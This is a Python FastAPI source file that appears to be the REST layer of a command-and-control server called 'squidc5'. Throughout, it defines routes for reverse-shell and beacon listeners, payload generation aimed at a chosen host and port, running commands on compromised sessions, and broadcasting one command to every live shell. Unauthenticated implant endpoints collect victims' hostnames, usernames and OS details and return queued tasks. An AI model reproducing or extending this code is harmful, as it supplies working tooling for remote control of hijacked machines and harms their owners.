"""REST API routes for operators, implants, and admin."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import PlainTextResponse, Response, StreamingResponse
from pydantic import BaseModel, Field

from squidc5.api.deps import get_auth, get_state, require_scope
from squidc5.auth.tokens import ALL_MCP_TOOLS, DEFAULT_MCP_TOOLS, SCOPES, AuthContext

# --- Request models ---


class TokenCreate(BaseModel):
    name: str
    scopes: list[str]
    mcp_tools: list[str] | None = None


class ListenerCreate(BaseModel):
    name: str
    kind: str = "http"
    host: str = "0.0.0.0"
    port: int
    config: dict[str, Any] = Field(default_factory=dict)


class TaskCreate(BaseModel):
    session_id: str
    command: str
    args: dict[str, Any] = Field(default_factory=dict)
    hitl_approved: bool = False


class PayloadRequest(BaseModel):
    template: str
    host: str
    port: int
    interval: int = 5


class LLMConfig(BaseModel):
    name: str
    provider: str = "openai"
    model: str
    base_url: str | None = None
    api_key: str | None = None
    capabilities: list[str] | None = None


class AIRunRequest(BaseModel):
    capability: str
    user_data: str = ""
    llm_id: str | None = None


class ShellCommand(BaseModel):
    session_id: str
    command: str
    hitl_approved: bool = False
    wait_sec: float = 2.5
    idle_sec: float = 0.45


class BeaconIn(BaseModel):
    session_id: str | None = None
    hostname: str | None = None
    username: str | None = None
    os_info: str | None = None
    metadata: dict[str, Any] = Field(default_factory=dict)


class TaskResultIn(BaseModel):
    task_id: str
    result: str
    status: str = "completed"


class PolicyUpdate(BaseModel):
    rules: dict[str, Any]


class FeaturesUpdate(BaseModel):
    features: dict[str, bool]


def build_api_router() -> APIRouter:
    api = APIRouter(prefix="/api/v1")

    # ----- Health / meta -----

    @api.get("/health")
    async def health(request: Request) -> dict[str, Any]:
        state = get_state(request)
        # Secure default: minimal fingerprint
        if not state.settings.expose_health_details:
            return {"status": "ok"}
        return {
            "status": "ok",
            "app": state.settings.app_name,
            "version": "0.1.0",
        }

    @api.get("/meta")
    async def meta(auth: AuthContext = Depends(get_auth)) -> dict[str, Any]:
        return {
            "scopes": sorted(SCOPES),
            "default_mcp_tools": sorted(DEFAULT_MCP_TOOLS),
            "all_mcp_tools": sorted(ALL_MCP_TOOLS),
            "actor": auth.name,
            "actor_type": auth.actor_type,
        }

    # ----- Tokens -----

    @api.post("/tokens")
    async def create_token(
        body: TokenCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("tokens:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(auth, "tokens.create", extra={"name": body.name})
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            tid, raw = await state.tokens.create(
                name=body.name,
                scopes=body.scopes,
                mcp_tools=body.mcp_tools,
                created_by=auth.name,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        return {"id": tid, "token": raw, "name": body.name, "scopes": body.scopes}

    @api.get("/tokens")
    async def list_tokens(
        request: Request,
        auth: AuthContext = Depends(require_scope("tokens:manage", "admin")),
    ) -> list[dict[str, Any]]:
        state = get_state(request)
        rows = await state.db.list_tokens()
        return [state.tokens.parse_row(r) for r in rows]

    @api.delete("/tokens/{token_id}")
    async def revoke_token(
        token_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("tokens:manage", "admin")),
    ) -> dict[str, bool]:
        state = get_state(request)
        ok = await state.tokens.revoke(token_id, auth.name)
        return {"revoked": ok}

    # ----- Sessions -----

    @api.get("/sessions")
    async def list_sessions(
        request: Request,
        status: str | None = None,
        live_only: bool = False,
        kind: str | None = None,
        auth: AuthContext = Depends(require_scope("sessions:read", "admin")),
    ) -> list[dict[str, Any]]:
        state = get_state(request)
        await state.policy.check_and_audit(auth, "sessions.list")
        # Reap reverse shells with no TCP channel; optionally probe execution
        probe = request.query_params.get("probe", "").lower() in ("1", "true", "yes")
        await state.sessions.close_orphaned_shells(probe=probe)
        rows = await state.sessions.list(status=status)
        if kind:
            kinds = {k.strip() for k in kind.split(",") if k.strip()}
            # aliases
            if kinds & {"shell", "rev", "reverse", "shells"}:
                kinds.update({"reverse_shell", "tcp"})
                kinds -= {"shell", "rev", "reverse", "shells"}
            rows = [r for r in rows if r.get("kind") in kinds]
        if live_only:
            # Default: only verified reverse shells (exec-proven) + active beacons
            filtered: list[dict[str, Any]] = []
            for r in rows:
                k = r.get("kind")
                if k in ("reverse_shell", "tcp"):
                    if r.get("interactive") and r.get("verified"):
                        filtered.append(r)
                elif k == "beacon":
                    if r.get("status") == "active":
                        filtered.append(r)
                else:
                    filtered.append(r)
            rows = filtered
        return rows

    @api.get("/sessions/{session_id}")
    async def get_session(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        await state.sessions.close_orphaned_shells()
        s = await state.sessions.get(session_id)
        if not s:
            raise HTTPException(404, "session not found")
        return s

    @api.post("/sessions/{session_id}/close")
    async def close_session(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:write", "admin")),
    ) -> dict[str, str]:
        state = get_state(request)
        await state.sessions.close(session_id)
        return {"status": "closed", "id": session_id}

    @api.post("/sessions/reap")
    async def reap_sessions(
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:write", "admin")),
    ) -> dict[str, int]:
        state = get_state(request)
        body: dict[str, Any] = {}
        try:
            body = await request.json()
        except Exception:
            body = {}
        probe = bool(body.get("probe", True))
        n = await state.sessions.close_orphaned_shells(probe=probe)
        return {"closed": n, "probed": probe}

    # ----- Tasks -----

    @api.get("/tasks")
    async def list_tasks(
        request: Request,
        session_id: str | None = None,
        auth: AuthContext = Depends(require_scope("tasks:read", "admin")),
    ) -> list[dict[str, Any]]:
        state = get_state(request)
        return await state.tasks.list(session_id=session_id)

    @api.post("/tasks")
    async def create_task(
        body: TaskCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(
            auth,
            "tasks.create",
            resource=body.session_id,
            extra={"hitl_approved": body.hitl_approved, "command": body.command[:100]},
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.tasks.create(
                session_id=body.session_id,
                command=body.command,
                args=body.args,
                created_by=auth.name,
            )
        except KeyError as e:
            raise HTTPException(404, str(e)) from e
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    @api.get("/tasks/{task_id}")
    async def get_task(
        task_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("tasks:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        t = await state.tasks.get(task_id)
        if not t:
            raise HTTPException(404, "task not found")
        return t

    # ----- Listeners -----

    @api.get("/listeners")
    async def list_listeners(
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:read", "admin")),
    ) -> list[dict[str, Any]]:
        return await get_state(request).listeners.list()

    @api.post("/listeners")
    async def create_listener(
        body: ListenerCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if body.kind == "http" and not await state.features.enabled("http_listeners"):
            raise HTTPException(403, "HTTP listeners disabled by feature flag")
        if body.kind in ("tcp", "reverse_shell") and not await state.features.enabled(
            "reverse_shell_listeners"
        ):
            raise HTTPException(403, "Reverse-shell/TCP listeners disabled by feature flag")
        decision = await state.policy.check_and_audit(
            auth, "listeners.create", extra={"port": body.port, "kind": body.kind}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.listeners.create(
                name=body.name, kind=body.kind, port=body.port, host=body.host, config=body.config
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    @api.post("/listeners/{listener_id}/start")
    async def start_listener(
        listener_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(auth, "listeners.start", resource=listener_id)
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.listeners.start(listener_id)
        except KeyError:
            raise HTTPException(404, "listener not found") from None
        except OSError as e:
            raise HTTPException(400, f"bind failed: {e}") from e

    @api.post("/listeners/{listener_id}/stop")
    async def stop_listener(
        listener_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        try:
            return await state.listeners.stop(listener_id)
        except KeyError:
            raise HTTPException(404, "listener not found") from None

    @api.delete("/listeners/{listener_id}")
    async def delete_listener(
        listener_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("listeners:write", "admin")),
    ) -> dict[str, bool]:
        ok = await get_state(request).listeners.delete(listener_id)
        return {"deleted": ok}

    # ----- Payloads -----

    @api.get("/payloads/templates")
    async def payload_templates(
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, list[str]]:
        from squidc5.payloads.generator import PayloadGenerator

        return {"templates": PayloadGenerator().list_templates()}

    @api.post("/payloads/generate")
    async def generate_payload(
        body: PayloadRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("payloads_generate"):
            raise HTTPException(403, "Payload generation is disabled by feature flag")
        decision = await state.policy.check_and_audit(
            auth, "payloads.generate", extra={"template": body.template}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            result = state.payloads.generate(
                template=body.template, host=body.host, port=body.port, interval=body.interval
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.metrics.incr("payloads.generated")
        return result

    # ----- Shell interact -----

    @api.post("/shell/command")
    async def shell_command(
        body: ShellCommand,
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        decision = await state.policy.check_and_audit(
            auth,
            "shell.interact",
            resource=body.session_id,
            extra={"hitl_approved": body.hitl_approved},
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        if not state.listeners.is_live(body.session_id):
            # Stale DB row looking "active" but TCP is gone
            await state.sessions.close(body.session_id)
            raise HTTPException(
                404,
                "No live TCP channel for this session (connection already dead). "
                "Wait for the implant to reconnect or send a new reverse shell.",
            )
        result = await state.listeners.run_shell(
            body.session_id,
            body.command,
            wait_sec=max(0.0, min(body.wait_sec, 30.0)),
            idle_sec=max(0.1, min(body.idle_sec, 5.0)),
        )
        if not result.get("sent"):
            await state.sessions.close(body.session_id)
            raise HTTPException(404, result.get("error") or "No live reverse shell for session")
        return result

    @api.post("/shell/broadcast")
    async def shell_broadcast(
        request: Request,
        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
    ) -> dict[str, Any]:
        """Send one command to every live reverse shell."""
        state = get_state(request)
        if not await state.features.enabled("shell_broadcast"):
            raise HTTPException(403, "Shell broadcast is disabled by feature flag")
        body = await request.json()
        command = str(body.get("command") or "").strip()
        if not command:
            raise HTTPException(400, "command required")
        wait_sec = float(body.get("wait_sec", 2.5))
        idle_sec = float(body.get("idle_sec", 0.45))
        hitl = bool(body.get("hitl_approved", False))
        decision = await state.policy.check_and_audit(
            auth,
            "shell.interact",
            resource="broadcast",
            extra={"hitl_approved": hitl, "command": command[:100]},
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)

        # Drop TCP-dead + non-executing zombies before broadcast
        await state.sessions.close_orphaned_shells(probe=True)
        rows = await state.sessions.list(status="active")
        targets = [
            r
            for r in rows
            if r.get("kind") in ("reverse_shell", "tcp")
            and state.listeners.is_live(r["id"])
            and state.listeners.is_verified(r["id"])
        ]
        results: list[dict[str, Any]] = []
        for r in targets:
            res = await state.listeners.run_shell(
                r["id"],
                command,
                wait_sec=max(0.0, min(wait_sec, 30.0)),
                idle_sec=max(0.1, min(idle_sec, 5.0)),
            )
            res["remote_addr"] = r.get("remote_addr")
            # If still echo-only, drop immediately
            out = (res.get("output") or "").strip()
            if res.get("sent") and out and out == command.strip():
                await state.listeners.drop_channel(r["id"])
                await state.sessions.close(r["id"])
                res["dropped"] = True
                res["error"] = "echo_only_zombie"
            results.append(res)
        return {
            "command": command,
            "targets": len(targets),
            "results": results,
        }

    @api.get("/sessions/{session_id}/output")
    async def session_output(
        session_id: str,
        request: Request,
        limit: int = 8000,
        auth: AuthContext = Depends(require_scope("shell:interact", "sessions:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not state.listeners.is_live(session_id):
            raise HTTPException(404, "No live reverse shell for session")
        text = state.listeners.get_output_text(session_id, limit_chars=max(100, min(limit, 50000)))
        return {
            "session_id": session_id,
            "interactive": True,
            "output": text,
            "bytes": len(text.encode("utf-8", errors="replace")),
        }

    # ----- Metrics / audit / events -----

    @api.get("/metrics")
    async def metrics(
        request: Request,
        auth: AuthContext = Depends(require_scope("metrics:read", "admin")),
    ) -> dict[str, Any]:
        return await get_state(request).metrics.snapshot()

    @api.get("/audit")
    async def audit_list(
        request: Request,
        limit: int = 100,
        offset: int = 0,
        auth: AuthContext = Depends(require_scope("audit:read", "admin")),
    ) -> list[dict[str, Any]]:
        return await get_state(request).audit.list(limit=limit, offset=offset)

    @api.get("/events/stream")
    async def events_stream(
        request: Request,
        auth: AuthContext = Depends(require_scope("metrics:read", "admin")),
    ) -> StreamingResponse:
        state = get_state(request)
        queue = state.metrics.subscribe()

        async def gen():
            try:
                yield f"data: {json.dumps({'type': 'connected'})}\n\n"
                while True:
                    if await request.is_disconnected():
                        break
                    try:
                        event = await asyncio.wait_for(queue.get(), timeout=15.0)
                        yield f"data: {json.dumps(event)}\n\n"
                    except TimeoutError:
                        yield f"data: {json.dumps({'type': 'ping'})}\n\n"
            finally:
                state.metrics.unsubscribe(queue)

        return StreamingResponse(gen(), media_type="text/event-stream")

    # ----- Policy -----

    @api.get("/policy")
    async def get_policy(
        request: Request,
        auth: AuthContext = Depends(require_scope("policy:manage", "admin")),
    ) -> dict[str, Any]:
        return await get_state(request).policy.get_rules()

    @api.put("/policy")
    async def update_policy(
        body: PolicyUpdate,
        request: Request,
        auth: AuthContext = Depends(require_scope("policy:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        await state.policy.update(body.rules, auth.name)
        return await state.policy.get_rules()

    # ----- Feature flags (admin) -----

    @api.get("/features")
    async def get_features(
        request: Request,
        auth: AuthContext = Depends(require_scope("admin", "policy:manage")),
    ) -> dict[str, Any]:
        state = get_state(request)
        flags = await state.features.get_all()
        return {
            "features": flags,
            "catalog": state.features.catalog(),
        }

    @api.put("/features")
    async def put_features(
        body: FeaturesUpdate,
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        flags = await state.features.set_many(body.features, auth.name)
        return {"features": flags, "catalog": state.features.catalog()}

    # ----- Ops admin UI (admin token only — never ship to non-admin clients) -----

    @api.get("/ops/admin.js")
    async def ops_admin_js(
        request: Request,
        auth: AuthContext = Depends(get_auth),
    ) -> Response:
        if not auth.has_scope("admin"):
            raise HTTPException(403, "Admin token required for admin UI")
        # Prefer packaged web dir (Docker: /app/web)
        candidates = [
            Path(__file__).resolve().parent.parent.parent.parent / "web" / "ops-admin.js",
            Path("/app/web/ops-admin.js"),
        ]
        path = next((p for p in candidates if p.is_file()), None)
        if path is None:
            raise HTTPException(404, "admin UI module missing")
        await get_state(request).db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="ops.admin_ui.load",
            details={},
            risk_score=2,
        )
        return PlainTextResponse(
            path.read_text(encoding="utf-8"),
            media_type="application/javascript",
            headers={"Cache-Control": "no-store"},
        )

    # ----- Admin AI / LLM -----

    @api.get("/llm")
    async def list_llm(
        request: Request,
        auth: AuthContext = Depends(require_scope("llm:manage", "admin", "ai:use")),
    ) -> list[dict[str, Any]]:
        return await get_state(request).admin_ai.list_llms()

    @api.post("/llm")
    async def configure_llm(
        body: LLMConfig,
        request: Request,
        auth: AuthContext = Depends(require_scope("llm:manage", "admin")),
    ) -> dict[str, str]:
        state = get_state(request)
        lid = await state.admin_ai.configure_llm(
            name=body.name,
            provider=body.provider,
            model=body.model,
            base_url=body.base_url,
            api_key=body.api_key,
            capabilities=body.capabilities,
        )
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="llm.configure",
            resource=lid,
            details={"name": body.name, "model": body.model, "provider": body.provider},
            risk_score=4,
        )
        return {"id": lid, "name": body.name, "model": body.model}

    @api.get("/ai/status")
    async def ai_status(
        request: Request,
        debug: bool = False,
        auth: AuthContext = Depends(require_scope("ai:use", "metrics:read", "admin")),
    ) -> dict[str, Any]:
        """Admin AI runtime status (no secrets). debug=1 adds recent call history."""
        return await get_state(request).admin_ai.status(debug=debug)

    @api.post("/ai/run")
    async def ai_run(
        body: AIRunRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("ai:use", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("ai_enabled"):
            raise HTTPException(403, "Admin AI is disabled by feature flag")
        decision = await state.policy.check_and_audit(
            auth, "ai.admin", extra={"capability": body.capability}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.admin_ai.run(
                capability=body.capability,
                user_data=body.user_data,
                actor=auth.name,
                llm_id=body.llm_id,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        except Exception as e:
            raise HTTPException(502, f"Admin AI error: {e}") from e

    # ----- Implant (no auth — session-bound beacon) -----

    implant = APIRouter(prefix="/implant", tags=["implant"])

    @implant.post("/beacon")
    async def beacon(body: BeaconIn, request: Request) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("implant_beacon"):
            raise HTTPException(403, "Implant beacon is disabled by feature flag")
        client = request.client.host if request.client else None
        if body.session_id:
            existing = await state.sessions.get(body.session_id)
            if existing and existing["status"] == "active":
                await state.sessions.heartbeat(
                    body.session_id,
                    hostname=body.hostname,
                    username=body.username,
                    os_info=body.os_info,
                )
                sid = body.session_id
            else:
                sid = await state.sessions.register(
                    kind="beacon",
                    remote_addr=client,
                    hostname=body.hostname,
                    username=body.username,
                    os_info=body.os_info,
                    metadata=body.metadata,
                )
        else:
            sid = await state.sessions.register(
                kind="beacon",
                remote_addr=client,
                hostname=body.hostname,
                username=body.username,
                os_info=body.os_info,
                metadata=body.metadata,
            )
        task = await state.tasks.poll(sid)
        return {"session_id": sid, "task": task}

    @implant.post("/beacon/result")
    async def beacon_result(body: TaskResultIn, request: Request) -> dict[str, str]:
        state = get_state(request)
        await state.tasks.complete(body.task_id, body.result, body.status)
        return {"status": "ok"}

    api.include_router(implant)
    return api
